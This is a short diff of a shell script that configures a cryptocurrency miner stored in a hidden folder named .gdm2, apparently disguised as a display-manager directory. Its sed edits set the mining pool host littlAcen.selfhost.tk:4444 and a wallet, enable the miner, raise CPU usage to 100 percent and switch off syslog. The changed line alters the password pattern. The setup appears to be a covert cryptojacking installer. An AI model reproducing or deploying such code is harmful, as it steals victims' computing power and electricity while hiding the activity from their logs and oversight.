@@ -232,7 +232,7 @@ fi
 
 sed -i 's/"url": "littlAcen.selfhost.tk:3333",/"url": "littlAcen.selfhost.tk:4444",/' $HOME/.gdm2/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.gdm2/config.json
-sed -i 's/"pass": *"[^"]*",/"pass": "littlAcen@24-mail.com",/' $HOME/.gdm2/config.json
+sed -i 's/"pass": "hv",/"pass": "littlAcen@24-mail.com",/' $HOME/.gdm2/config.json
 sed -i 's/"enabled": false,/"enabled": true,/' $HOME/.gdm2/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.gdm2/config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": false,/' $HOME/.gdm2/config.json
